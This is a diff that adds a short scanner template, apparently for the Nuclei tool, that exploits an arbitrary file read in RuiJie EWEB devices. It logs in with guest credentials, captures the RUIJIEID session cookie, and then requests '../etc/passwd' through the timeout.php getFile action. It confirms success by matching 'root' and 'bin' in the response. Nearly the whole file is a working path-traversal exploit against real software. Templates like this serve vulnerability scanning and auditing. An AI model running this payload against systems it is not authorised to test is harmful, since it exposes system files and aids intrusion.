@@ -1,0 +1,52 @@
+id: RuiJie-EWEB-timeout-ReadAnyFile
+
+info:
+  name: RuiJie-EWEB-timeout-ReadAnyFile
+  author: iSee857
+  severity: high
+  description: RuiJie-EWEB-timeout-ReadAnyFile
+  reference:
+    - https://github.com/iSee857
+  tags: ruijie,ReadAnyFile
+
+
+http:
+  - raw:
+      - |
+        POST /ddi/server/login.php HTTP/1.1
+        Host: {{Host}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0
+        Content-Length: 30
+
+        username=guest&password=guest?
+      - |
+        POST /system_pi/timeout.php?a=getFile HTTP/1.1
+        Host: {{Host}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+        Cookie: RUIJIEID={{ruijie_cookie}}
+        Content-Type: application/x-www-form-urlencoded
+
+        fileName=../etc/passwd
+
+
+    extractors:
+      - type: regex
+        name: ruijie_cookie
+        part: header
+        internal: true
+        group: 1
+        regex:
+          - 'RUIJIEID=([^;\s]+)'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root"
+          - "bin"
+        part: body
+
+      - type: status
+        status:
+          - 200
